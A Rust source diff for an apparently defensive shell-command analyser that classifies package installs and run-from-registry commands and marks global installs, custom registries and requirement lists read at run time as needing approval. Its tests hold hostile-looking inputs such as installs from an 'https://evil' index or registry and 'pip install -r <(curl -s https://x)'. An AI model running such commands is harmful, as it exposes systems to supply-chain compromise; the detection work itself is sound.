@@ -179,37 +179,62 @@ const HOST_SHELL: Shell = if cfg!(windows) { Shell::Power } else { Shell::Posix 
 pub enum Ecosystem {
     /// `npm`/`pnpm`/`yarn`/`bun` (`package.json`).
     Npm,
-    /// `cargo add` (`Cargo.toml`).
+    /// `cargo add`/`cargo install` (`Cargo.toml`).
     Cargo,
-    /// `pip`/`pip3`/`uv pip` (`requirements*.txt`, `pyproject.toml`).
+    /// `pip`/`python -m pip`/`uv pip`/`uv add` (`requirements*.txt`, `pyproject.toml`).
     Python,
-    /// `go get` (`go.mod`).
+    /// `go get`/`go install` (`go.mod`).
     Go,
 }
 
-/// A package-manager command that names packages to install
-/// (`npm install left-pad`, `cargo add serde`).
+/// What an [`Install`] does with its packages.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Form {
+    /// Installs them (`npm install x`, `cargo add y`, `pip install z`).
+    Add,
+    /// Runs a package's binary, fetching the package when it is not installed
+    /// locally (`npx x`, `npm exec x`).
+    ExecLocal,
+    /// Runs a package fetched from the registry (`pnpm dlx`, `yarn dlx`,
+    /// `bunx`, `uvx`, `pipx run`).
+    Exec,
+}
+
+/// A package-manager command that installs or runs named packages
+/// (`npm install left-pad`, `cargo add serde`, `npx eslint`).
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct Install {
     /// Which manifest the packages belong in.
     pub ecosystem: Ecosystem,
-    /// `-g`/`--global` or `yarn global add`: installs outside the project.
-    pub global: bool,
+    /// Install or run.
+    pub form: Form,
     /// The package arguments as written (versions, extras, URLs, paths kept);
-    /// option values (`-r file`, `--features x`) are left out, except a
-    /// `-e`/`--editable`, `--git` or `--path` value, which is a package source.
+    /// option values (`--features x`) are left out, except a `-e`/`--editable`,
+    /// `--git`, `--path`, `--package`/`--from`/`--spec` value, which names a
+    /// package or its source. Empty only when `always_ask` is set.
     pub packages: Vec<String>,
+    /// Why this command needs approval whatever the manifest declares: a global
+    /// install, a custom index or registry, packages supplied at run time.
+    pub always_ask: Option<String>,
 }
 
-/// Every named-package install in `line`.
+/// Every install or run of named packages in `line`.
 ///
-/// Found wherever [`analyze`] looks: after prefixes (`sudo`, `env X=1`), inside wrappers (`bash -c`), in every
-/// command of a chain or pipeline. A command that names no package
+/// Found wherever [`analyze`] looks: after prefixes (`sudo`, `timeout 60`,
+/// `env X=1`), inside wrappers (`bash -c`), in every command of a chain or
+/// pipeline. A command that names no package and has no `always_ask` reason
 /// (`npm install`, `npm ci`, `pip install -r reqs.txt`) is not listed.
 #[must_use]
 pub fn installs(line: &str) -> Vec<Install> {
+    installs_in(line, HOST_SHELL)
+}
+
+/// [installs] for an explicit shell dialect.
+fn installs_in(line: &str, sh: Shell) -> Vec<Install> {
     let mut sink = Sink::default();
-    scan(line, HOST_SHELL, 0, &mut sink);
+    scan(line, sh, 0, &mut sink);
+    sink.installs
+        .retain(|i| !i.packages.is_empty() || i.always_ask.is_some());
     sink.installs
 }
 
@@ -1034,8 +1059,16 @@ fn check_wrapped(
     }
     starts.sort_unstable();
     starts.dedup();
+    let seen = risks.installs.len();
     for s in starts.into_iter().filter(|&s| s < args.len()) {
         check_cmd(&args[s..], stdin, multi, sh, depth + 1, risks, false);
+    }
+    // C6: `xargs` appends arguments read at run time, so packages are unknown.
+    if name == "xargs" {
+        for i in &mut risks.installs[seen..] {
+            i.always_ask
+                .get_or_insert_with(|| "packages are supplied at run time through `xargs`".into());
+        }
     }
 }
 
@@ -1231,12 +1264,17 @@ fn is_env_assignment(tok: &str) -> bool {
 }
 
 /// Reduce a command word to its lower-cased bare program name so a path, a
-/// `.exe` suffix or an alias-suppressing backslash cannot disguise it:
-/// `/bin/rm`, `\rm` and `C:\Windows\System32\cmd.exe` become `rm`, `rm`, `cmd`.
+/// Windows launcher suffix (`.exe`, `.cmd`, `.bat`, `.ps1`) or an
+/// alias-suppressing backslash cannot disguise it: `/bin/rm`, `\rm`,
+/// `C:\Windows\System32\cmd.exe` and `npm.cmd` become `rm`, `rm`, `cmd`, `npm`.
 fn program_name(tok: &str) -> String {
     let tok = tok.trim_start_matches('\\');
     let base = tok.rsplit(['/', '\\']).next().unwrap_or(tok).to_ascii_lowercase();
-    base.strip_suffix(".exe").unwrap_or(&base).to_string()
+    [".exe", ".cmd", ".bat", ".ps1"]
+        .iter()
+        .find_map(|s| base.strip_suffix(s))
+        .unwrap_or(&base)
+        .to_string()
 }
 
 /// Command words that wrap and then exec a *later* command, so anchoring a
@@ -1263,86 +1301,311 @@ fn is_command_wrapper(name: &str) -> bool {
     )
 }
 
-/// Record an install (`npm|pnpm|yarn|bun install|i|add`, `yarn global add`,
-/// `pip|pip3 install`, `uv pip install`, `cargo add`, `go get`) and the
-/// packages it names. `args` are the words after the program name.
+/// Record an install or run of packages (see [`install_spec`] for the forms)
+/// and the packages it names. `args` are the words after the program name.
 fn detect_install(name: &str, args: &[Word], sink: &mut Sink) {
-    if !matches!(
-        name,
-        "npm" | "pnpm" | "yarn" | "bun" | "pip" | "pip3" | "uv" | "cargo" | "go"
-    ) {
-        return;
+    if let Some(i) = parse_install(name, args) {
+        sink.installs.push(i);
     }
-    let words: Vec<&str> = args.iter().map(|w| w.text.as_str()).collect();
-    // ponytail: the subcommand is the first non-option word, so a value-taking
-    // option before it (`npm --prefix app install x`) hides the install; add
-    // per-manager global-option tables if that gap matters.
-    let Some(k) = words.iter().position(|w| !w.starts_with(['-', '+'])) else {
-        return;
+}
+
+/// npm's spellings of `install` (aliases and accepted typos) plus `add`.
+const NPM_INSTALL: &[&str] = &[
+    "i",
+    "in",
+    "ins",
+    "inst",
+    "insta",
+    "instal",
+    "install",
+    "isnt",
+    "isnta",
+    "isntal",
+    "isntall",
+    "add",
+    "install-test",
+    "it",
+];
+
+/// Options whose (space-separated) value says where requirements are read from.
+const REQUIREMENT_OPTS: &str = "-r --requirement --requirements -c --constraint --constraints";
+
+/// The package manager `name` runs and the words after it: `pip3.12` and
+/// `python3 -m pip` are `pip`.
+fn package_manager<'a>(name: &str, args: &'a [Word]) -> Option<(&'static str, &'a [Word])> {
+    const MANAGERS: [&str; 11] = [
+        "npm", "pnpm", "yarn", "bun", "uv", "cargo", "go", "npx", "bunx", "uvx", "pipx",
+    ];
+    let versioned = |s: &str, base: &str| {
+        s.strip_prefix(base)
+            .is_some_and(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'))
     };
-    let mut rest = &words[k + 1..];
-    let mut global = false;
-    let ecosystem = match (name, words[k]) {
-        ("npm" | "pnpm" | "bun", "install" | "i" | "add") | ("yarn", "install" | "add") => Ecosystem::Npm,
-        ("yarn", "global") if rest.first() == Some(&"add") => {
-            global = true;
-            rest = &rest[1..];
-            Ecosystem::Npm
+    if let Some(m) = MANAGERS.iter().find(|m| **m == name) {
+        return Some((m, args));
+    }
+    if versioned(name, "pip") {
+        return Some(("pip", args));
+    }
+    if name != "py" && !versioned(name, "python") {
+        return None;
+    }
+    // `python [opts] -m pip ...` (or glued `-mpip`).
+    let (next, module) = args.iter().enumerate().find_map(|(k, w)| match w.text.as_str() {
+        "-m" => Some((k + 2, args.get(k + 1)?.text.as_str())),
+        t => t.strip_prefix("-m").filter(|m| !m.is_empty()).map(|m| (k + 1, m)),
+    })?;
+    versioned(module, "pip").then(|| ("pip", args.get(next..).unwrap_or_default()))
+}
+
+/// Index of the first word that `is_verb` accepts, skipping options and, right
+/// after an option, one word that may be its value (`npm --prefix app install`).
+/// `None` when another word comes first (`npm run add`).
+fn find_verb(ws: &[Word], is_verb: impl Fn(&str) -> bool) -> Option<usize> {
+    let mut after_option = false;
+    for (i, w) in ws.iter().enumerate() {
+        let t = w.text.as_str();
+        if t.len() > 1 && t.starts_with(['-', '+']) {
+            after_option = !t.contains('=');
+        } else if is_verb(t) {
+            return Some(i);
+        } else if std::mem::take(&mut after_option) {
+            // The previous option's value.
+        } else {
+            return None;
         }
-        ("pip" | "pip3", "install") => Ecosystem::Python,
-        ("uv", "pip") if rest.first() == Some(&"install") => {
-            rest = &rest[1..];
-            Ecosystem::Python
-        }
-        ("cargo", "add") => Ecosystem::Cargo,
-        ("go", "get") => Ecosystem::Go,
-        _ => return,
+    }
+    None
+}
+
+/// How one install/run form reads its arguments.
+struct InstallSpec {
+    ecosystem: Ecosystem,
+    form: Form,
+    /// Options whose value is the next word (space-separated list).
+    takes_value: &'static str,
+    /// Options whose value is a package or its source.
+    names_package: &'static str,
+    /// Options that fetch from another index or registry.
+    index: &'static str,
+    /// Every named package needs approval (a global install).
+    always: Option<&'static str>,
+}
+
+/// The form `manager` + `verb` runs: `npm|pnpm|yarn|bun install|add` (npm
+/// aliases too), `yarn global add`, `pip install`, `uv pip install`, `uv add`,
+/// `cargo add`, `go get`; global `cargo install`, `go install`; and the
+/// run-from-registry forms `npx`, `npm exec`, `pnpm dlx`, `yarn dlx`, `bunx`,
+/// `uvx`, `pipx run`.
+#[allow(clippy::too_many_lines)] // one table row per form
+fn install_spec(manager: &str, verb: &str) -> Option<InstallSpec> {
+    const PIP_TAKES: &str = "-t --target --prefix --root --python -p --src --platform --python-version \
+         --implementation --abi --upgrade-strategy --progress-bar --log --cache-dir --proxy --timeout --retries";
+    const PIP_INDEX: &str = "-i --index-url --extra-index-url -f --find-links --index --default-index";
+    const CARGO_TAKES: &str =
+        "-F --features --rename -p --package --manifest-path --target --branch --tag --rev --config -Z";
+    let spec = |ecosystem, form, takes_value, names_package, index, always| InstallSpec {
+        ecosystem,
+        form,
+        takes_value,
+        names_package,
+        index,
+        always,
     };
-    // Options whose value is the next word (space-separated); for `source` that
-    // value is itself a package source (a path or repository).
-    let (takes_value, source) = match ecosystem {
-        Ecosystem::Npm => (
-            "--registry --prefix --tag -w --workspace -C --dir --filter --cwd",
+    let (npm, py, add) = (Ecosystem::Npm, Ecosystem::Python, Form::Add);
+    Some(match (manager, verb) {
+        ("npm", v) if NPM_INSTALL.contains(&v) => spec(
+            npm,
+            add,
+            "--prefix -C --tag -w --workspace --loglevel --cache --userconfig --location",
             "",
+            "--registry",
+            None,
         ),
-        Ecosystem::Python => (
-            "-r --requirement -c --constraint -i --index-url --extra-index-url -f --find-links -t --target \
-             --prefix --root --python",
-            "-e --editable",
+        ("pnpm", "install" | "i" | "add") => spec(
+            npm,
+            add,
+            "-C --dir --filter --config --store-dir --virtual-store-dir",
+            "",
+            "--registry",
+            None,
         ),
-        Ecosystem::Cargo => (
-            "-F --features --rename -p --package --manifest-path --registry --target --branch --tag --rev",
+        ("yarn", "install" | "add") => spec(npm, add, "--cwd", "", "--registry", None),
+        ("yarn", "global add") => spec(npm, add, "--cwd", "", "--registry", Some("global install")),
+        ("bun", "install" | "i" | "add") => {
+            spec(npm, add, "--cwd --cache-dir --backend", "", "--registry", None)
+        }
+        ("npx", "") | ("npm", "exec" | "x") => spec(
+            npm,
+            Form::ExecLocal,
+            "-c --call --cache --prefix",
+            "-p --package",
+            "--registry",
+            None,
+        ),
+        ("pnpm" | "yarn", "dlx") | ("bunx", "") | ("bun", "x") => spec(
+            npm,
+            Form::Exec,
+            "-C --dir --cwd",
+            "-p --package",
+            "--registry",
+            None,
+        ),
+        ("pip", "install") | ("uv", "pip install") => {
+            spec(py, add, PIP_TAKES, "-e --editable", PIP_INDEX, None)
+        }
+        ("uv", "add") => spec(
+            py,
+            add,
+            "--group --optional --extra --package --project --directory --python -p --tag --branch --rev \
+             --marker -m --bounds",
+            "",
+            PIP_INDEX,
+            None,
+        ),
+        ("uvx", "") => spec(
+            py,
+            Form::Exec,
+            "--python -p --directory --project",
+            "--from --with",
+            PIP_INDEX,
+            None,
+        ),
+        ("pipx", "run") => spec(py, Form::Exec, "--python", "--spec", "--index-url", None),
+        ("cargo", "add") => spec(
+            Ecosystem::Cargo,
+            add,
+            CARGO_TAKES,
             "--git --path",
+            "--registry --index",
+            None,
         ),
-        Ecosystem::Go => ("", ""),
+        ("cargo", "install") => spec(
+            Ecosystem::Cargo,
+            add,
+            "-F --features --version --vers --root --bin --example --target --target-dir --profile -j \
+             --jobs --branch --tag --rev --config -Z",
+            "--git --path",
+            "--registry --index",
+            Some("global install (`cargo install`)"),
+        ),
+        ("go", "get") => spec(Ecosystem::Go, add, "", "", "", None),
+        ("go", "install") => spec(
+            Ecosystem::Go,
+            add,
+            "",
+            "",
+            "",
+            Some("global install (`go install`)"),
+        ),
+        _ => return None,
+    })
+}
+
+/// The install or run `name args` performs, if it is one of [`install_spec`]'s
+/// forms. Global managers' options before the verb are skipped.
+fn parse_install(name: &str, args: &[Word]) -> Option<Install> {
+    let (manager, args) = package_manager(name, args)?;
+    let verbs: &[&str] = match manager {
+        "npm" => &["exec", "x"],
+        "pnpm" => &["install", "i", "add", "dlx"],
+        "yarn" => &["install", "add", "global", "dlx"],
+        "bun" => &["install", "i", "add", "x"],
+        "pip" => &["install"],
+        "uv" => &["pip", "add"],
+        "cargo" => &["add", "install"],
+        "go" => &["get", "install"],
+        "pipx" => &["run"],
+        _ => &[], // npx, bunx, uvx: no verb
     };
+    let (verb, mut rest) = if verbs.is_empty() {
+        ("", args)
+    } else {
+        let k = find_verb(args, |t| {
+            verbs.contains(&t) || (manager == "npm" && NPM_INSTALL.contains(&t))
+        })?;
+        (args[k].text.as_str(), &args[k + 1..])
+    };
+    // Two-word verbs: `yarn global add`, `uv pip install`.
+    let verb = match (manager, verb) {
+        ("yarn", "global") | ("uv", "pip") => {
+            let second = if manager == "yarn" { "add" } else { "install" };
+            rest = &rest[find_verb(rest, |t| t == second)? + 1..];
+            if manager == "yarn" {
+                "global add"
+            } else {
+                "pip install"
+            }
+        }
+        _ => verb,
+    };
+    let spec = install_spec(manager, verb)?;
+    read_install_args(&spec, rest)
+}
+
+/// Read the packages and approval reasons from the words after the verb.
+fn read_install_args(spec: &InstallSpec, rest: &[Word]) -> Option<Install> {
+    let exec = spec.form != Form::Add;
+    let has = |list: &str, opt: &str| list.split_whitespace().any(|o| o == opt);
     let mut packages = Vec::new();
+    let mut always = spec.always.map(str::to_string);
+    let mut runtime = None;
     let mut i = 0;
-    while let Some(&w) = rest.get(i) {
+    while let Some(w) = rest.get(i) {
         i += 1;
-        if matches!(w, "-g" | "--global") {
-            global = true;
-        } else if source.split_whitespace().any(|o| o == w) {
-            packages.extend(rest.get(i).map(|v| (*v).to_string()));
+        let t = w.text.as_str();
+        if !(t.len() > 1 && t.starts_with('-')) {
+            packages.push(t.to_string());
+            if exec {
+                break; // the rest are the program's own arguments
+            }
+            continue;
+        }
+        if spec.form == Form::ExecLocal && matches!(t, "--no-install" | "--no") {
+            return None; // never fetches: runs only what is installed
+        }
+        let (opt, inline) = match t.split_once('=') {
+            Some((o, v)) if o.starts_with("--") => (o, Some((v, false))),
+            _ => (t, None),
+        };
+        let requirements = spec.ecosystem == Ecosystem::Python && has(REQUIREMENT_OPTS, opt);
+        let takes = requirements
+            || [spec.takes_value, spec.names_package, spec.index]
+                .iter()
+                .any(|l| has(l, opt));
+        let value = inline.or_else(|| {
+            let v = rest.get(i).filter(|_| takes)?;
             i += 1;
-        } else if let Some(v) = source
-            .split_whitespace()
-            .find_map(|o| w.strip_prefix(o).and_then(|r| r.strip_prefix('=')))
-        {
-            packages.push(v.to_string());
-        } else if takes_value.split_whitespace().any(|o| o == w) {
-            i += 1;
-        } else if !w.starts_with('-') {
-            packages.push(w.to_string());
+            Some((v.text.as_str(), v.dynamic || v.group))
+        });
+        let global = (spec.ecosystem == Ecosystem::Npm && matches!(opt, "-g" | "--global"))
+            || (spec.ecosystem == Ecosystem::Python && opt == "--system")
+            || (opt == "--location" && value.is_some_and(|(v, _)| v == "global"));
+        if global {
+            always.get_or_insert_with(|| format!("global install (`{t}`)"));
+        } else if has(spec.index, opt) {
+            always.get_or_insert_with(|| format!("fetched from another index or registry (`{opt}`)"));
+        } else if has(spec.names_package, opt) {
+            packages.extend(value.map(|(v, _)| v.to_string()));
+        } else if let Some((v, dynamic)) = value.filter(|_| requirements) {
+            let unknown = dynamic
+                || v.contains("://")
+                || matches!(v, "-" | "/dev/stdin")
+                || v.starts_with(['<', '$', '`']);
+            if unknown {
+                runtime = Some(format!("requirements read at run time from `{v}`"));
+            }
         }
     }
-    if !packages.is_empty() {
-        sink.installs.push(Install {
-            ecosystem,
-            global,
-            packages,
-        });
+    // A reason about named packages means nothing when none is named.
+    if packages.is_empty() {
+        always = None;
     }
+    Some(Install {
+        ecosystem: spec.ecosystem,
+        form: spec.form,
+        packages,
+        always_ask: runtime.or(always),
+    })
 }
 
 // --- detectors ------------------------------------------------------------
@@ -2460,8 +2723,8 @@ mod tests {
         };
         let i = one("sudo npm install left-pad");
         assert_eq!(
-            (i.ecosystem, i.global, i.packages),
-            (Ecosystem::Npm, false, vec!["left-pad".into()])
+            (i.ecosystem, i.form, i.always_ask, i.packages),
+            (Ecosystem::Npm, Form::Add, None, vec!["left-pad".into()])
         );
         let i = one("cd app && pip install --upgrade requests==2.31");
         assert_eq!(
@@ -2480,10 +2743,11 @@ mod tests {
         );
         let i = one("yarn global add @scope/name@^2");
         assert_eq!(
-            (i.ecosystem, i.global, i.packages),
-            (Ecosystem::Npm, true, vec!["@scope/name@^2".into()])
+            (i.ecosystem, i.packages),
+            (Ecosystem::Npm, vec!["@scope/name@^2".into()])
         );
-        assert!(one("npm i -g left-pad").global);
+        assert!(i.always_ask.is_some_and(|w| w.contains("global")));
+        assert!(one("npm i -g left-pad").always_ask.is_some());
         assert_eq!(
             one("cargo add --git https://x/y.git y").packages,
             ["https://x/y.git", "y"]
@@ -2504,5 +2768,127 @@ mod tests {
         ] {
             assert!(installs(none).is_empty(), "{none:?}: {:?}", installs(none));
         }
+    }
+
+    fn only(line: &str) -> Install {
+        let mut v = installs(line);
+        assert_eq!(v.len(), 1, "{line:?}: {v:?}");
+        v.remove(0)
+    }
+
+    /// C6 I2: the verb is found after the manager's own options, npm aliases,
+    /// per-manager option tables, Windows launchers and pip through Python.
+    #[test]
+    fn install_spellings_are_recognised() {
+        for line in [
+            "npm --prefix app install x",
+            "npm --loglevel silent install x",
+            "pnpm -C app add x",
+            "pnpm --dir app add x",
+            "pnpm add -w x",
+            "yarn --cwd app add x",
+            "uv --directory app pip install x",
+            "pip --python .venv/bin/python install x",
+            "npm.cmd install x",
+            "npm.ps1 i x",
+            "python -m pip install x",
+            "python3 -m pip install x",
+            "py -3.12 -m pip install x",
+            "python3.12 -mpip install x",
+            "pip3 install x",
+            "pip3.12 install x",
+            "timeout 600 npm install x",
+        ] {
+            let i = only(line);
+            assert_eq!(
+                (i.form, i.packages, i.always_ask),
+                (Form::Add, vec!["x".to_string()], None),
+                "{line}"
+            );
+        }
+        assert_eq!(only("go -C sub get example.com/x").packages, ["example.com/x"]);
+        for alias in NPM_INSTALL {
+            assert_eq!(only(&format!("npm {alias} x")).packages, ["x"], "npm {alias}");
+        }
+        assert!(installs("npm run add x").is_empty(), "a script named add");
+        assert!(installs("python -m venv x").is_empty());
+    }
+
+    /// C6 I4 / S1 / S2: run-time package lists, global installs and other
+    /// indexes always need approval.
+    #[test]
+    fn installs_that_always_need_approval_say_why() {
+        for (line, why) in [
+            ("xargs npm install < list.txt", "xargs"),
+            ("cat list | xargs pip install", "xargs"),
+            ("pip install -r https://x/req.txt", "run time"),
+            ("pip install -r -", "run time"),
+            ("pip install --requirement=/dev/stdin", "run time"),
+            ("pip install -c $(mktemp)", "run time"),
+            ("npm install --location=global x", "global"),
+            ("npm install --location global x", "global"),
+            ("uv pip install --system x", "global"),
+            ("cargo install ripgrep", "global"),
+            ("go install example.com/x@v1.2.0", "global"),
+            ("yarn global add x", "global"),
+            ("pip install --index-url https://evil x", "index"),
+            ("pip install --extra-index-url=https://evil x", "index"),
+            ("pip install --find-links ./wheels x", "index"),
+            ("npm install --registry https://evil x", "registry"),
+            ("pnpm add --registry=https://evil x", "registry"),
+            ("yarn add x --registry https://evil", "registry"),
+            ("cargo add x --registry evil", "registry"),
+        ] {
+            let i = only(line);
+            let got = i.always_ask.unwrap_or_default();
+            assert!(got.contains(why), "{line}: {got:?}");
+        }
+        // Process substitution (a Posix shell; PowerShell has none).
+        let ps = installs_in("pip install -r <(curl -s https://x)", Shell::Posix);
+        assert!(
+            ps[0]
+                .always_ask
+                .as_deref()
+                .is_some_and(|w| w.contains("run time")),
+            "{ps:?}"
+        );
+        // A plain requirements file, a local build or a global install with
+        // nothing named is not flagged.
+        for none in [
+            "pip install -r requirements.txt",
+            "go install",
+            "go install ./cmd/x",
+        ] {
+            assert!(
+                installs(none)
+                    .iter()
+                    .all(|i| i.always_ask.is_none() || i.packages.iter().all(|p| p.starts_with('.'))),
+                "{none}"
+            );
+        }
+    }
+
+    /// C6 S3 / S4: run-from-registry forms report the package; `uv add` is an
+    /// install; `npx --no-install` never fetches.
+    #[test]
+    fn run_from_registry_forms_and_uv_add() {
+        for (line, form, pkg) in [
+            ("npx eslint --fix src", Form::ExecLocal, "eslint"),
+            ("npx -y create-app@5 my-app", Form::ExecLocal, "create-app@5"),
+            ("npm exec -- prettier .", Form::ExecLocal, "prettier"),
+            ("npm x tsc", Form::ExecLocal, "tsc"),
+            ("pnpm dlx cowsay hi", Form::Exec, "cowsay"),
+            ("yarn dlx cowsay", Form::Exec, "cowsay"),
+            ("bunx cowsay", Form::Exec, "cowsay"),
+            ("uvx ruff check", Form::Exec, "ruff"),
+            ("pipx run black .", Form::Exec, "black"),
+            ("uv add httpx --dev", Form::Add, "httpx"),
+        ] {
+            let i = only(line);
+            assert_eq!((i.form, i.packages[0].as_str()), (form, pkg), "{line}");
+        }
+        assert_eq!(only("uvx --from httpie http GET x").packages[0], "httpie");
+        assert!(installs("npx --no-install eslint").is_empty());
+        assert!(installs("npx --no eslint").is_empty());
     }
 }
